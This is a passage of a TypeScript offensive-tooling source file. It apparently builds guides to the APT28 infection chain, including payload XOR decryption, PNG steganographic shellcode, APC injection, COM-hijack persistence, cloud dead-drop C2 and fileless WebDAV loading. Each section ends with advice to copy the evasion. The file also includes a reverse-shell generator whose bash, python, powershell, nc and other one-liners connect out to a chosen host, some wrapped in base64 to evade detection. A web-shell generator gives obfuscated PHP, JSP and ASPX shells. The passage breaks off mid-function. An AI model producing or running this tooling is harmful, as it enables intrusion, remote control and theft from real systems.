                        const uint8_t* key, size_t keyLen) {
    // keyLen = 76 (APT28使用固定76字节密钥)

    // 步骤1: 分配PAGE_READWRITE权限的内存
    void* decrypted = VirtualAlloc(NULL, dataLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!decrypted) return NULL;

    // 步骤2: 逐字节轮转XOR解密
    uint8_t* out = (uint8_t*)decrypted;
    for (size_t i = 0; i < dataLen; i++) {
        out[i] = encryptedData[i] ^ key[i % keyLen];  // 轮转索引: i % 76
    }

    // 步骤3: 解密后内容可能还不是直接可执行代码
    // APT28: 解密后得到的是PNG图片，需要进一步隐写提取

    return (uint8_t*)decrypted;
}
\`\`\`

**密钥管理**:
- 76字节密钥本身也被混淆存储（可能用单字节XOR 0x43加密）
- 密钥在DLL数据段中以非连续方式存储
- 不同样本使用不同密钥

**为什么是76字节**:
- 密钥长度足够大（76字节 = 608位），暴力破解不可行
- 但又不会太大导致解密性能开销
- 轮转XOR = 多表替代密码，比单字节XOR安全得多

**与单字节XOR对比**:
| 单字节XOR (0x43) | 76字节轮转XOR |
|-----------------|--------------|
| 密钥空间: 256 | 密钥空间: 2^(76*8) = 2^608 |
| 可被频率分析破解 | 多表替代，频率分析无效 |
| YARA可写简单规则 | 每个样本密钥不同 |
| 暴力破解瞬间完成 | 暴力破解不可能 |

**如何应用**:
- 对核心payload使用多字节轮转XOR加密
- 密钥存储在混淆后的数据段中
- 运行时动态解密到RW权限内存`
}

// ── APT28 — PNG隐写术提取Shellcode ───────────────────────────────────────

function apt28PNGSteganography(): string {
  return `## APT28 PNG隐写术 — 从图片像素提取Shellcode（SimpleLoader.dll 分析）

### 问题:
直接将shellcode存储在二进制文件中容易被静态分析识别。
EDR/AV可以扫描内存中的shellcode特征码。

### APT28的解决方案: 将shellcode藏在PNG图片的像素数据中

这是APT28 Operation Neusploit中最具技术含量的部分。
SimpleLoader内置了**完整的PNG解码器**（10个专用函数），不依赖外部库。

### PNG文件结构:
\`\`\`
PNG文件 = PNG Signature (8字节) + Chunks
  ├── IHDR Chunk: 图片头（宽、高、位深、颜色类型）
  ├── PLTE Chunk: 调色板（索引颜色模式）
  ├── IDAT Chunk: 图像数据（压缩的像素数据）— shellcode藏在这里
  └── IEND Chunk: 图片结束标记
\`\`\`

### APT28的PNG解码流程（10个专用函数）:
\`\`\`c
// 步骤1: 解析IHDR头
ParseIHDR(pngData, offset) → width, height, bitDepth, colorType

// 步骤2: 遍历所有Chunk
while (chunkType != "IEND") {
    chunkLength = ReadUint32(pngData, offset);
    chunkType = ReadString(pngData, offset + 4, 4);

    if (chunkType == "PLTE") {
        // 提取调色板
        ExtractPalette(pngData, offset + 8, chunkLength);
    }
    else if (chunkType == "IDAT") {
        // 核心数据块 — shellcode隐藏在IDAT中
        // IDAT包含zlib压缩的像素数据
        DecompressIDAT(pngData, offset + 8, chunkLength);
        pixelData = InflateZlib(compressedData);
    }

    offset += 12 + chunkLength;  // length(4) + type(4) + data + crc(4)
}
\`\`\`

### LSB提取算法（APT28的方法）:
\`\`\`c
// 步骤3: 从像素数据中提取隐藏数据（LSB - 最低有效位）
uint8_t* ExtractHiddenData(uint8_t* pixelData, size_t pixelLen, size_t hiddenLen) {
    uint8_t* hidden = malloc(hiddenLen);
    size_t bitIndex = 0;

    // APT28使用特定偏移量和掩码提取
    // 可能的方法: 只提取每个像素RGB通道的最低位
    for (size_t i = 0; i < hiddenLen * 8; i++) {
        // 从像素数据的最低位提取1bit
        uint8_t lsb = pixelData[APT28_OFFSETS[i] % pixelLen] & 0x01;
        hidden[i / 8] |= (lsb << (7 - (i % 8)));
    }

    return hidden;
}

// 或者按步长跳跃读取:
uint8_t* ExtractWithStride(uint8_t* pixelData, size_t stride, size_t mask) {
    // stride = 步长（每隔N个像素读取一次）
    // mask = 掩码（如0x01取LSB，0x03取最低2位）
    // APT28可能使用自定义stride和mask组合
}
\`\`\`

### 完整的APT28解密链:
\`\`\`
1. 从DLL资源段读取加密的PNG文件 (SplashScreen.png)
   ↓
2. 76字节轮转XOR解密PNG文件数据
   ↓
3. 解析PNG格式 → 10个专用函数处理IHDR/PLTE/IDAT/IEND
   ↓
4. 从IDAT chunk提取压缩像素数据 → zlib解压
   ↓
5. LSB提取: 从像素最低位还原隐藏的二进制流
   ↓
6. 最后一道解密 (XOR或RC4) → 得到真正的shellcode
   ↓
7. VirtualAlloc(RW) → 写入shellcode → VirtualProtect(RX) → 执行
\`\`\`

### 为什么PNG隐写有效:
1. **静态分析绕过**: PNG图片看起来是正常的图片文件
2. **YARA规则失效**: shellcode不连续存储在二进制中
3. **需要完整的PNG解析器**才能提取 — 增加了逆向分析难度
4. **多层加密**: XOR → PNG压缩 → LSB → 最终XOR/RC4
5. **网络流量中不易检测**: 传输图片文件是正常的网络行为

### 如何应用到评估:
- 将shellcode嵌入PNG图片的LSB位
- 加载器内置精简PNG解析逻辑
- 多层加密增加分析难度
- 图片文件在磁盘和网络中都不引起怀疑`
}

// ── APT28 — RW→RX页面转换（避免RWX检测） ──────────────────────────────────

function apt28MemoryPermissionTransition(): string {
  return `## APT28 内存权限转换 — RW→RX避免EDR检测

### 问题:
现代EDR对 PAGE_EXECUTE_READWRITE (RWX) 内存极其敏感。
直接分配RWX权限内存 → 写入shellcode → 执行，是最常见的恶意软件模式。
许多EDR规则直接告警: "进程分配了RWX内存"。

### APT28的解决方案: 两阶段内存权限管理

**APT28的做法（SimpleLoader + CovenantGrunt注入流程）**:
\`\`\`c
// 步骤1: 分配 PAGE_READWRITE (RW) 权限内存 — 不触发RWX告警
LPVOID shellcodeAddr = VirtualAllocEx(
    hProcess,                    // explorer.exe句柄
    NULL,                        // 让系统选择地址
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE               // 注意: RW, NOT RWX!
);

// 步骤2: 写入shellcode（此时内存是RW，可以写入）
WriteProcessMemory(hProcess, shellcodeAddr, decryptedShellcode, shellcodeSize, NULL);

// 步骤3: 关键一步 — 修改权限为 PAGE_EXECUTE_READ (RX)
DWORD oldProtect;
VirtualProtectEx(
    hProcess,
    shellcodeAddr,
    shellcodeSize,
    PAGE_EXECUTE_READ,           // RX, 不是RWX!
    &oldProtect
);

// 步骤4: 执行shellcode（此时内存是RX，只能读和执行）
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
\`\`\`

### 为什么这比RWX更安全:
| 权限 | 写入 | 执行 | EDR告警 |
|------|------|------|---------|
| PAGE_EXECUTE_READWRITE (RWX) | 是 | 是 | **高** — 最常见恶意模式 |
| PAGE_READWRITE → PAGE_EXECUTE_READ (RW→RX) | 阶段1 | 阶段2 | **低** — 合法软件也这样做 |
| PAGE_READWRITE (RW) | 是 | 否 | 无 — 但无法执行 |
| PAGE_EXECUTE_READ (RX) | 否 | 是 | 低 — 但无法写入 |

### 合法软件也使用RW→RX:
- JIT编译器（V8 JavaScript引擎、.NET CLR）: 先写入编译代码(RW)，再设置为可执行(RX)
- 动态链接器: 先加载代码到内存(RW)，然后fixup重定位后设为RX
- 因此RW→RX在合法软件中很常见，EDR难以区分

### APT28的更精细做法:
\`\`\`c
// CovenantGrunt使用的内存权限转换:

// 1. 先分配RW内存
LPVOID mem = VirtualAllocEx(hProcess, 0, size, MEM_COMMIT, PAGE_READWRITE);

// 2. 写入加密的shellcode
WriteProcessMemory(hProcess, mem, encryptedShellcode, size, NULL);

// 3. 在目标进程中就地解密（仍为RW权限）
// 这样EDR即使扫描内存，看到的是解密过程中的混合数据

// 4. 解密完成后立即修改为RX
VirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, &oldProtect);

// 5. 执行 — 此时内存只有RX权限，无法再修改
\`\`\`

### 如何应用到评估:
- 永远不要直接分配RWX内存
- 使用两阶段: RW写入 → RX执行
- 更隐蔽的做法: 在RW阶段就解密完成，然后立即转RX
- 这比简单的VirtualAlloc+RWX要安全得多`
}

// ── APT28 — APC注入（QueueUserAPC） ──────────────────────────────────────

function apt28APCInjection(): string {
  return `## APT28 APC注入 — QueueUserAPC比CreateRemoteThread更隐蔽

### 问题:
CreateRemoteThread是最常见的进程注入执行方式，
也是EDR重点监控的API调用。创建远程线程 = 高告警等级。

### APT28的解决方案: 异步过程调用（APC）注入

**APC注入流程**:
\`\`\`c
// 步骤1: 枚举进程，找到目标（如explorer.exe）
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe32;
pe32.dwSize = sizeof(PROCESSENTRY32);
Process32First(hSnapshot, &pe32);

DWORD targetPid = 0;
do {
    if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
        targetPid = pe32.th32ProcessID;
        break;
    }
} while (Process32Next(hSnapshot, &pe32));

// 步骤2: 打开目标进程
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

// 步骤3: 在目标进程中分配内存 (RW权限)
LPVOID mem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// 步骤4: 写入shellcode
WriteProcessMemory(hProcess, mem, shellcode, shellcodeSize, NULL);

// 步骤5: 修改权限为RX
VirtualProtectEx(hProcess, mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

// 步骤6: 【关键区别】使用QueueUserAPC而非CreateRemoteThread
// 枚举目标进程的所有线程
HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te32;
te32.dwSize = sizeof(THREADENTRY32);
Thread32First(hThreadSnap, &te32);

do {
    if (te32.th32OwnerProcessID == targetPid) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
        if (hThread) {
            // 将shellcode地址加入APC队列
            // 当线程进入"可告警等待状态"时自动执行
            QueueUserAPC((PAPCFUNC)mem, hThread, 0);
            CloseHandle(hThread);
            break;
        }
    }
} while (Thread32Next(hThreadSnap, &te32));
\`\`\`

### APC注入为什么更隐蔽:
1. **不创建新线程**: QueueUserAPC不创建新线程，只是往现有线程的APC队列添加一个回调
2. **EDR监控较少**: CreateRemoteThread是EDR重点监控的API，QueueUserAPC监控较少
3. **执行时机隐蔽**: APC在目标线程进入"可告警等待状态"（SleepEx、WaitForSingleObjectEx等）时执行
4. **线程上下文**: shellcode在目标进程的正常线程中执行，不是新线程

### APC注入的局限:
- 需要目标线程进入可告警等待状态才会触发
- 如果目标线程很忙或不调用可告警等待函数，APC可能延迟执行
- 解决: explorer.exe经常进入等待状态（等待用户输入），所以是理想目标

### 对比:
| CreateRemoteThread | QueueUserAPC |
|-------------------|-------------|
| 创建新线程 | 复用现有线程 |
| EDR重点监控 | EDR监控较少 |
| 立即执行 | 等待可告警状态 |
| 容易被检测 | 更隐蔽 |

### 如何应用到评估:
- 进程注入时优先使用APC而非CreateRemoteThread
- 选择经常进入等待状态的进程（explorer.exe、svchost.exe）
- 结合RW→RX权限转换，进一步降低检测率`
}

// ── APT28 — COM劫持持久化 ────────────────────────────────────────────────

function apt28COMHijacking(): string {
  return `## APT28 COM劫持持久化 — InprocServer32注册表修改

### 问题:
传统的Run键注册表启动项（HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run）
容易被安全软件监控和检测到。

### APT28的解决方案: COM组件劫持

APT28修改注册表中的COM组件注册信息，将合法CLSID的InprocServer32指向自己的DLL。

### APT28使用的具体注册表路径:
\`\`\`
HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}\\\\InprocServer32
\`\`\`

**修改前**: (默认值) = C:\\\\Windows\\\\System32\\\\legit.dll （合法系统DLL）
**修改后**: (默认值) = C:\\\\Users\\\\Public\\\\伪装名.dll （APT28的后门DLL）

### COM劫持的工作原理:
\`\`\`
1. 系统或合法应用尝试创建COM对象 {D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}
   ↓
2. Windows COM运行时查询注册表: HKCU\\\\...\\\\CLSID\\\\{...}\\\\InprocServer32
   ↓
3. 读取 (默认值) 注册表项 → 获取DLL路径
   ↓
4. 调用 LoadLibrary(DLL路径) 加载DLL
   ↓
5. APT28的后门DLL被加载到合法进程的内存中
   ↓
6. DLL的DllMain执行 → 启动后门/C2通信
\`\`\`

### 为什么COM劫持有效:
1. **隐蔽**: 不修改Run键等常见自启动位置
2. **合法触发**: 系统操作正常触发COM组件加载，不是恶意进程启动
3. **权限要求低**: HKCU（当前用户）权限即可修改，不需要管理员
4. **加载到合法进程**: DLL被系统/合法应用加载，进程看起来正常
5. **持久化**: 每次系统尝试加载该COM组件时都会触发

### APT28的额外隐蔽措施:
\`\`\`
# 使用不常见但合法的CLSID:
{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}
  - 这是Windows系统中的一个COM组件
  - 不常用，被劫持后不容易被发现

# 伪装DLL文件名:
使用看起来合法的名字，如:
  - msedge_update.dll
  - onedrive_sync.dll
  - windows_helper.dll

# 线程延迟启动:
在DllMain中不直接执行后门代码，而是:
1. 创建新线程
2. 线程Sleep随机时间（避免启动时立即触发）
3. 然后执行C2连接
\`\`\`

### 其他可劫持的COM键值:
\`\`\`
HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{...}\\\\InprocServer32    # DLL加载
HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{...}\\\\LocalServer32    # EXE加载
HKCU\\\\Software\\\\Classes\\\\*\\\\shellex\\\\ContextMenuHandlers  # 右键菜单
HKCU\\\\Software\\\\Classes\\\\*\\\\shellex\\\\PropertySheetHandlers # 属性页
\`\`\`

### 如何应用到评估:
- 使用不常见的CLSID进行劫持
- DLL名称伪装成合法软件
- 在DllMain中使用延迟执行
- 劫持后DLL被合法进程加载，进程行为看起来正常`
}

// ── APT28 — Dead Drop Resolver（云API C2） ───────────────────────────────

function apt28DeadDropResolver(): string {
  return `## APT28 Dead Drop Resolver — 合法云API作为C2通信信道

### 问题:
直接连接攻击者的C2服务器容易被网络监控检测到。
固定的IP、域名、端口、协议都是网络签名的基础。

### APT28的解决方案: 使用合法云服务API作为Dead Drop

APT28的CovenantGrunt后门不直接连接攻击者IP，
而是使用 **filen.io**（合法云盘服务）的官方API进行交互。

### Dead Drop工作原理:
\`\`\`
1. CovenantGrunt定期（Beaconing）发起HTTPS请求到filen.io的API:
   → POST https://api.filen.io/v1/file/list
   → 看起来像正常的云盘同步操作

2. 攻击者在filen.io的特定共享目录中放置指令:
   → 指令隐藏在正常文件的特定字段中
   → 可能是加密的配置文件、文本文件、甚至图片元数据

3. 植入物下载并解析文件:
   → 提取隐藏的指令（如执行命令、下载新模块等）
   → 执行指令后将结果上传到另一个隐藏位置

4. 双向通信:
   → 植入物读取 → 获取攻击者指令
   → 植入物写入 → 上传执行结果
\`\`\`

### 为什么Dead Drop有效:
1. **合法域名**: filen.io是合法云服务，不会被防火墙/IDS封禁
2. **HTTPS加密**: 所有通信通过HTTPS，中间人无法看到内容
3. **流量正常**: 看起来像正常的云盘API调用
4. **无固定C2基础设施**: 不需要攻击者运营C2服务器
5. **异步通信**: 指令和结果通过第三方平台中转
6. **快速切换**: 可以换用其他云服务（Google Drive, Dropbox等）

### 类似技术:
- Dropbox作为Dead Drop
- GitHub/GitLab仓库存放指令
- Pastebin作为命令中转站
- Telegram Bot API作为C2信道
- Discord Webhook作为C2信道

### Dead Drop的通信流程:
\`\`\`c
// 伪代码 — APT28 CovenantGrunt的Dead Drop通信
void BeaconAndCheckCommands() {
    // 1. 生成看起来正常的API请求
    char* request = BuildFilenAPIRequest(
        "POST", "/v1/file/list",
        "Authorization: Bearer " + API_TOKEN,
        "{\\"folder_id\\": \\"TARGET_FOLDER\\"}"
    );

    // 2. 通过系统代理或直连发送HTTPS请求
    HTTPResponse* resp = SendHTTPSRequest(
        "api.filen.io", 443,
        request
    );

    // 3. 解析响应，提取隐藏指令
    Command* cmd = ExtractHiddenCommand(resp->body);

    if (cmd != NULL) {
        // 4. 执行指令
        Result* result = ExecuteCommand(cmd);

        // 5. 上传结果到隐藏位置
        UploadResult(result);
    }
}
\`\`\`

### 如何应用到评估:
- 使用合法云服务的API进行C2通信
- 指令隐藏在正常的API响应中
- 利用HTTPS加密隐藏通信内容
- 选择合适的云服务（API文档公开、流量正常、不被封锁）
- 这种方法在对抗网络层检测时极其有效`
}

// ── APT28 — WebDAV UNC路径无落地执行 ─────────────────────────────────────

function apt28WebDAVUNC(): string {
  return `## APT28 WebDAV UNC路径 — DLL无落地内存加载执行

### 问题:
将恶意DLL写到磁盘上容易被文件监控检测。
文件落地 → EDR扫描文件 → 检测到恶意特征。

### APT28的解决方案: UNC路径直接从WebDAV服务器加载DLL，不写磁盘

**APT28的LNK构造**:
\`\`\`
LNK文件的Target属性:
C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\104.168.x.x\\\\webdav\\\\SimpleLoader.dll,EntryPoint

关键点:
1. 使用UNC路径 (\\\\server\\\\share\\\\file.dll)
2. 通过Windows WebClient服务访问远程WebDAV共享
3. DLL直接从网络加载到内存，不写到本地磁盘
4. rundll32.exe是系统合法程序（LOLBin）
\`\`\`

### WebDAV UNC加载流程:
\`\`\`
1. 用户打开RTF/DOC文档
   ↓
2. OLE对象触发 → COM对象 Shell.Explorer.1 被实例化
   ↓
3. Shell.Explorer.1的LocationURL = \\\\104.168.x.x\\\\webdav\\\\payload.lnk
   ↓
4. Windows WebClient服务发起出站WebDAV请求
   ↓
5. payload.lnk被执行 → rundll32.exe加载SimpleLoader.dll
   ↓
6. SimpleLoader.dll从UNC路径映射到内存（不落地）
   ↓
7. rundll32.exe调用SimpleLoader.dll的EntryPoint
\`\`\`

### 底层API行为:
\`\`\`c
// 当访问UNC路径时:
// 1. WebClient服务启动（如未运行则自动启动）
// 2. 发起HTTP/WebDAV请求到远程服务器
// 3. 将远程文件映射到本地网络驱动器
// 4. rundll32.exe通过内存映射读取DLL
// 5. LoadLibrary从网络路径加载DLL

// 关键: 文件数据直接从网络流读取到内存
// 不经过本地文件系统的Write操作
\`\`\`

### 为什么这有效:
1. **无文件落地**: DLL不写入本地磁盘 — 文件监控检测不到
2. **合法进程**: rundll32.exe是系统自带程序
3. **合法协议**: WebDAV是Windows内置协议
4. **LOLBin**: Living Off the Land Binary — 使用系统自带工具
5. **系统服务级别**: 通过WebClient服务发起请求，下沉到系统服务层
6. **绕过应用层监控**: 很多EDR只监控Office进程的HTTP请求，不监控系统服务

### 互斥量防多开:
\`\`\`c
// SimpleLoader.dll运行的第一件事:
// CreateMutexW — 确保只运行一次

// 互斥量名称混淆:
// 使用XOR 0x43解密互斥量名称
const uint8_t encodedMutex[] = {0x41, 0x22, 0x55, ...}; // XOR 0x43后得到真实名称
wchar_t* mutexName = DecryptString(encodedMutex, sizeof(encodedMutex), 0x43);

HANDLE hMutex = CreateMutexW(NULL, TRUE, mutexName);
if (GetLastError() == ERROR_ALREADY_EXISTS) {
    // 已经感染过，立即退出
    ExitProcess(0);
}
\`\`\`

### 如何应用到评估:
- 使用UNC路径从WebDAV加载DLL，避免文件落地
- 结合rundll32.exe等LOLBin执行
- 使用互斥量防止重复执行
- 互斥量名称用XOR混淆存储`
}

// ── APT28 综合操作模式 ───────────────────────────────────────────────────

function apt28OperationalPattern(): string {
  return `## APT28 操作模式 — Operation Neusploit 完整感染链分析

APT28在CVE-2026-21509利用中展现了多层递进的免杀对抗思路。

### 完整感染链:
\`\`\`
第一阶段: 文档触发
  RTF文件 → CVE-2026-21509 → COM对象 Shell.Explorer.1 → UNC路径访问

第二阶段: WebDAV拉取
  UNC \\\\attacker\\\\webdav\\\\ → payload.lnk + SimpleLoader.dll (无落地)

第三阶段: SimpleLoader执行
  CreateMutexW (防多开, XOR 0x43混淆)
  → 交替字节XOR解密字符串
  → VirtualAlloc(RW) 分配内存
  → 76字节轮转XOR解密核心载荷
  → PNG解码 (10个专用函数: IHDR/PLTE/IDAT/IEND)
  → LSB隐写提取shellcode
  → 最终XOR/RC4解密

第四阶段: 进程注入
  枚举explorer.exe进程
  → VirtualAllocEx(RW) 分配内存
  → WriteProcessMemory 写入shellcode
  → VirtualProtectEx 修改为RX (不是RWX!)
  → QueueUserAPC 注入 (不是CreateRemoteThread!)

第五阶段: C2通信
  CovenantGrunt .NET后门
  → HTTPS到filen.io官方API (Dead Drop Resolver)
  → 定期Beaconing检查指令
  → 指令隐藏在文件/配置中

第六阶段: 持久化
  COM劫持: HKCU\\\\...\\\\CLSID\\\\{...}\\\\InprocServer32
  → 将合法DLL路径替换为后门DLL
  → 系统正常操作触发加载
\`\`\`

### APT28免杀对抗核心思路:
1. **多层加密**: XOR(单字节) → XOR(轮转76字节) → PNG隐写 → 最终XOR/RC4
2. **无文件落地**: UNC路径直接内存加载
3. **合法工具**: rundll32.exe、WebClient服务、COM组件
4. **权限最小化**: RW→RX，避免RWX
5. **隐蔽执行**: APC注入 > CreateRemoteThread
6. **合法C2**: 云API替代直接C2服务器
7. **隐蔽持久化**: COM劫持替代Run键

### 与Havoc/Sliver的区别:
| APT28 | Havoc | Sliver |
|-------|-------|--------|
| PNG隐写载荷 | C源码编译 | Go编译 |
| 76字节轮转XOR | Hash API解析 | Garble混淆 |
| Dead Drop云API | 自建C2 | 多传输协议 |
| COM劫持持久化 | N/A | 服务安装 |
| UNC无落地 | N/A | N/A |
| APC注入 | 间接syscall | CreateRemoteThread |
| RW→RX转换 | N/A | RW→RX(有时) |

### 如何应用:
- 多层加密链: 至少2-3层加密叠加
- 文件不落地的UNC/WebDAV加载
- 使用LOLBin执行payload
- APC注入替代CreateRemoteThread
- 永远使用RW→RX而非RWX
- 考虑Dead Drop模式的C2通信
- COM劫持作为隐蔽持久化手段`
}

// ── Reverse shell generator — multi-language, multi-encoding ────────────────

function reverseShell(host: string, port: number, lang: string, encoding: string): string {
  const out: string[] = ['[TechniqueGenerator] Reverse Shell Variants', '═'.repeat(60), '']
  out.push(`Target: ${host}:${port}  Language: ${lang}  Encoding: ${encoding}`)
  out.push('')

  const generators: Record<string, () => string> = {
    bash: () => `bash -i >& /dev/tcp/${host}/${port} 0>&1`,
    bash_alt: () => `0<&196;exec 196<>/dev/tcp/${host}/${port}; sh <&196 >&196 2>&196`,
    bash_gz: () => `# Pre-compress: gzip -9 | base64 (smaller over the wire)\necho "BASE64_OF_GZIPPED_SCRIPT" | base64 -d | gunzip | bash`,
    python: () => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
    python_a: () => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`,
    perl: () => `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    php: () => `php -r '$sock=fsockopen("${host}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`,
    php_a: () => `php -r '$sock=fsockopen("${host}",${port});$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
    nc: () => `nc -e /bin/sh ${host} ${port}`,
    nc_mkfifo: () => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
    socat: () => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${host}:${port}`,
    powershell: () => `powershell -nop -w hidden -noni -c "$c=New-Object Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
    powershell_b64: () => `# powershell -nop -w hidden -noni -enc <UTF16LE_BASE64_OF_ABOVE>`,
    java: () => `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${host}/${port};cat <&5 | while read line; do \\\\$line 2>&5 >&5; done"].toArray()); p.waitFor();`,
    ruby: () => `ruby -rsocket -e 'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    go: () => `echo 'package main;import("net";"os/exec";"log");func main(){c,e:=net.Dial("tcp","${host}:${port}");if e!=nil{log.Fatal(e)};cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go`,
    rust: () => `# Cargo.toml: [dependencies] tokio = { version = "1", features = ["full"] }\n# use std::process::Command; use std::os::unix::io::{FromRawFd,RawFd}; fn main(){let s=std::net::TcpStream::connect(("${host}:${port}")).unwrap();let fd:RawFd=s.into_raw_fd();unsafe{let f=std::fs::File::from_raw_fd(fd);Command::new("/bin/bash").arg("-i").stdin(f.try_clone().unwrap()).stdout(f.try_clone().unwrap()).stderr(f.try_clone().unwrap()).spawn().unwrap().wait().unwrap();}}`,
    awk: () => `awk 'BEGIN{s="/inet/tcp/0/${host}/${port}";while(1){do{printf "> "&s|"getline c";if((c|"getline")>0)print c|&s}while(c!="exit")|s}}' /etc/passwd`,
  }

  const wantLangs = lang === 'all' ? Object.keys(generators) : [lang]
  for (const l of wantLangs) {
    if (!generators[l]) continue
    out.push(`## ${l}`)
    out.push('```')
    out.push(generators[l]())
    out.push('```')
    out.push('')
  }

  if (encoding === 'base64' || encoding === 'all') {
    out.push('## Base64-encoded wrappers (defeats signature-based detection)')
    out.push('```bash')
    out.push('# Bash:')
    out.push(`echo '${Buffer.from(`bash -i >& /dev/tcp/${host}/${port} 0>&1`).toString('base64')}' | base64 -d | bash`)
    out.push('')
    out.push('# Python:')
    out.push(`python3 -c "$(echo '${Buffer.from(generators.python().replace(/^python3 -c '/, '').replace(/'$/, '')).toString('base64')}' | base64 -d)"`)
    out.push('```')
    out.push('')
  }

  if (encoding === 'hex' || encoding === 'all') {
    out.push('## Hex-encoded (for HTTP smuggling, header injection, etc.)')
    out.push('```bash')
    out.push(`xxd -p -c 100 <<< '${generators.bash()}'`)
    out.push('# Decoded payload hex (place in HTTP header / DNS subdomain / etc.):')
    out.push(Buffer.from(generators.bash()).toString('hex'))
    out.push('```')
    out.push('')
  }

  return out.join('\n')
}

// ── Web shell generator — multi-platform, multi-obfuscation ─────────────────

function webShell(platform: string, obfuscation: string): string {
  const out: string[] = ['[TechniqueGenerator] Web Shell Variants', '═'.repeat(60), '']
  out.push(`Platform: ${platform}  Obfuscation: ${obfuscation}`)
  out.push('')

  if (platform === 'php' || platform === 'all') {
    out.push('## PHP (most common)')
    out.push('')
    out.push('### Level 0: classic eval')
    out.push('```php')
    out.push("<?php system($_GET['c']); ?>")
    out.push('```')
    out.push('')
    if (obfuscation !== 'none') {
      out.push('### Level 1: base64 + eval')
      out.push('```php')
      out.push("<?php eval(base64_decode('" + Buffer.from("system($_GET['c']);").toString('base64') + "')); ?>")
      out.push('```')
      out.push('')
      out.push('### Level 2: gzdeflate + base64 + eval')
      out.push('```php')
      const compressed = require('zlib').deflateRawSync("system($_GET['c']);").toString('base64')
      out.push("<?php @eval(@base64_decode(@gzinflate(base64_decode('" + compressed + "')))); ?>")
      out.push('```')
      out.push('')
      out.push('### Level 3: variable function + chr concatenation')
      out.push('```php')
      out.push("<?php $a='sys'.'tem';$a($_GET['c']); ?>")
      out.push('```')
      out.push('')
      out.push('### Level 4: XOR key + split strings (WAF-bypass level)')
      out.push('```php')
      out.push("<?php $k='_KEY_';$x=base64_decode('XOR_OF_system');for($i=0;$i<strlen($x);$i++)$x[$i]=chr(ord($x[$i])^ord($k[$i%strlen($k)]));$x($_GET['c']); ?>")
      out.push('```')
      out.push('')
      out.push('### Level 5: image-polyglot (embedded in EXIF)')
      out.push('# See: exiftool -Comment=\'<?php system($_GET[c]);?>\' cover.jpg')
      out.push('# Or use jpg_shelltools / phpgif / weevly3 to generate')
      out.push('')
    }
  }

  if (platform === 'jsp' || platform === 'all') {
    out.push('## JSP / Tomcat')
    out.push('```jsp')
    out.push('<%@ page import="java.util.*,java.io.*"%>')
    out.push('<% Process p=Runtime.getRuntime().exec(request.getParameter("c"));')
    out.push('   BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));')
    out.push('   String line; while((line=br.readLine())!=null) out.println(line); %>')
    out.push('```')
    out.push('')
    if (obfuscation !== 'none') {
      out.push('### JSP encoded:')
      out.push('```jsp')
      out.push('<%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream()).useDelimiter("\\\\A").next() %>')
      out.push('```')
    }
  }

  if (platform === 'aspx' || platform === 'all') {
    out.push('## ASPX / IIS')
    out.push('```aspx')
    out.push('<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>')
    out.push('```')
    out.push('')
    out.push('### ASPX encoded:')
    out.push('```aspx')
    out.push('<%@ Page Language="C#" %>')
    out.push('<% Response.Write(new System.IO.StreamReader(System.Diagnostics.Process.GetProcessById(')
